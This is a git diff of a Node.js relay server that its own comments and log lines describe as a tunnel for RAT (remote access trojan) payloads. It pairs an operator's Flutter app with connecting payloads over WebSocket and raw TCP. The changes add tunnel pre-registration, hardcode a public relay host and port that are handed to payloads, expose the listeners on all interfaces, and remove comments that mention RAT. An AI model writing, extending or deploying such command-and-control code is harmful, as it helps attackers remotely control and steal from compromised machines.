@@ -11,6 +11,7 @@ const wss = new WebSocket.Server({ server });
 // Store active tunnels
 const tunnels = new Map();
 const payloads = new Map();
+const pendingTunnels = new Map(); // For pre-registered tunnels
 
 // TCP connections for RAT
 const tcpClients = new Map();
@@ -32,7 +33,35 @@ app.get('/', (req, res) => {
         tunnels: tunnels.size,
         payloads: payloads.size,
         tcpClients: tcpClients.size,
+        pending: pendingTunnels.size,
         timestamp: new Date().toISOString()
+    });
+});
+
+// Register a new tunnel (called by Flutter app)
+app.post('/api/tunnel/register', (req, res) => {
+    const { port, type } = req.body;
+    const token = generateToken();
+    
+    console.log(`[${new Date().toISOString()}] Registering tunnel: port=${port}, type=${type}, token=${token}`);
+    
+    const tunnelInfo = {
+        token: token,
+        port: port,
+        type: type,
+        registeredAt: new Date(),
+        public_url: `https://${req.headers.host}/${token}`
+    };
+    
+    pendingTunnels.set(token, tunnelInfo);
+    
+    res.json({
+        success: true,
+        token: token,
+        public_url: tunnelInfo.public_url,
+        tcp_port: 30225,
+        tcp_host: 'gondola.proxy.rlwy.net',
+        message: 'Tunnel registered. Connect via WebSocket to activate.'
     });
 });
 
@@ -42,7 +71,12 @@ app.get('/api/tunnel/:id', (req, res) => {
     if (tunnel) {
         res.json({ url: tunnel.url, port: tunnel.port, status: 'active' });
     } else {
-        res.status(404).json({ error: 'Tunnel not found' });
+        const pending = pendingTunnels.get(req.params.id);
+        if (pending) {
+            res.json({ url: pending.public_url, port: pending.port, status: 'pending' });
+        } else {
+            res.status(404).json({ error: 'Tunnel not found' });
+        }
     }
 });
 
@@ -51,7 +85,7 @@ app.use((req, res) => {
     res.status(404).json({
         status: 'error',
         message: `Route ${req.method} ${req.url} not found`,
-        availableRoutes: ['GET /', 'GET /api/tunnel/:id', 'WebSocket /', 'TCP on port 8081']
+        availableRoutes: ['GET /', 'POST /api/tunnel/register', 'GET /api/tunnel/:id', 'WebSocket /']
     });
 });
 
@@ -64,14 +98,12 @@ const tcpServer = net.createServer((socket) => {
     
     console.log(`[${new Date().toISOString()}] 🔌 TCP connection from ${socket.remoteAddress}:${socket.remotePort} (ID: ${clientId})`);
     
-    // Send welcome message
     socket.write(`Welcome to Fly0Rakoon TCP Tunnel\nYour ID: ${clientId}\n\n`);
     
     socket.on('data', (data) => {
         const message = data.toString().trim();
         console.log(`[${new Date().toISOString()}] 📦 TCP data from ${clientId}: ${message.substring(0, 100)}`);
         
-        // Check if it's a tunnel registration
         if (message.startsWith('REGISTER:')) {
             const tunnelId = message.split(':')[1];
             const tunnel = tunnels.get(tunnelId);
@@ -82,9 +114,7 @@ const tcpServer = net.createServer((socket) => {
             } else {
                 socket.write(`ERROR: Tunnel ${tunnelId} not found\n`);
             }
-        }
-        // Forward to WebSocket if tunnel exists
-        else {
+        } else {
             for (const [tunnelId, tunnel] of tunnels) {
                 if (tunnel.tcpSocket === socket && tunnel.ws) {
                     tunnel.ws.send(JSON.stringify({
@@ -101,7 +131,6 @@ const tcpServer = net.createServer((socket) => {
         console.log(`[${new Date().toISOString()}] 🔌 TCP client ${clientId} disconnected`);
         tcpClients.delete(clientId);
         
-        // Clean up tunnel references
         for (const [tunnelId, tunnel] of tunnels) {
             if (tunnel.tcpSocket === socket) {
                 delete tunnel.tcpSocket;
@@ -121,9 +150,8 @@ const tcpServer = net.createServer((socket) => {
     });
 });
 
-tcpServer.listen(TCP_PORT, () => {
+tcpServer.listen(TCP_PORT, '0.0.0.0', () => {
     console.log(`🔌 TCP Server running on port ${TCP_PORT}`);
-    console.log(`   For RAT payloads: connect to port ${TCP_PORT}`);
 });
 
 // ==================== WEBSOCKET SERVER FOR FLUTTER APP ====================
@@ -133,30 +161,40 @@ wss.on('connection', (ws, req) => {
     const port = url.searchParams.get('port');
     const token = url.searchParams.get('token') || generateToken();
 
-    console.log(`[${new Date().toISOString()}] WebSocket connection: ${type}, port: ${port}`);
+    console.log(`[${new Date().toISOString()}] WebSocket connection: ${type}, port: ${port}, token: ${token}`);
 
     if (type === 'app') {
-        // App connection (your Flutter app)
-        tunnels.set(token, {
+        // Check if this token was pre-registered
+        const pending = pendingTunnels.get(token);
+        
+        const tunnel = {
             ws,
             port,
             type: 'app',
             url: `https://${req.headers.host}/${token}`,
             connectedAt: new Date()
-        });
+        };
+        
+        if (pending) {
+            tunnel.registeredAt = pending.registeredAt;
+            pendingTunnels.delete(token);
+            console.log(`✅ App tunnel activated (pre-registered): ${token}`);
+        }
+        
+        tunnels.set(token, tunnel);
 
         ws.send(JSON.stringify({
             type: 'registered',
             token: token,
-            url: `https://${req.headers.host}/${token}`,
+            url: tunnel.url,
             tcpPort: TCP_PORT,
-            message: 'Tunnel created! Your payload can connect via TCP or WebSocket'
+            tcpHost: 'gondola.proxy.rlwy.net',
+            message: 'Tunnel created! Your payload can connect via TCP'
         }));
 
         console.log(`✅ App tunnel created: ${token}`);
 
     } else if (type === 'payload') {
-        // Payload connection (WebSocket)
         const tunnelToken = url.searchParams.get('tunnel');
         const tunnel = tunnels.get(tunnelToken);
 
@@ -181,7 +219,6 @@ wss.on('connection', (ws, req) => {
 
             console.log(`✅ Payload connected to tunnel: ${tunnelToken}`);
 
-            // Relay messages between app and payload
             ws.on('message', (data) => {
                 if (tunnel.ws.readyState === WebSocket.OPEN) {
                     tunnel.ws.send(data);
@@ -204,7 +241,6 @@ wss.on('connection', (ws, req) => {
         }
     }
 
-    // Handle disconnection
     ws.on('close', () => {
         if (type === 'app') {
             const tunnel = tunnels.get(token);
@@ -232,16 +268,12 @@ wss.on('connection', (ws, req) => {
     });
 });
 
-// Generate random token
 function generateToken() {
     return Math.random().toString(36).substring(2, 15);
 }
 
 // Start HTTP/WebSocket server
 const PORT = process.env.PORT || 8080;
-server.listen(PORT, () => {
+server.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 HTTP/WebSocket Server running on port ${PORT}`);
-    console.log(`📡 WebSocket endpoint: ws://localhost:${PORT}`);
-    console.log(`🌐 HTTP endpoint: http://localhost:${PORT}`);
-    console.log(`🔌 TCP endpoint for RAT: tcp://localhost:${TCP_PORT}`);
 });
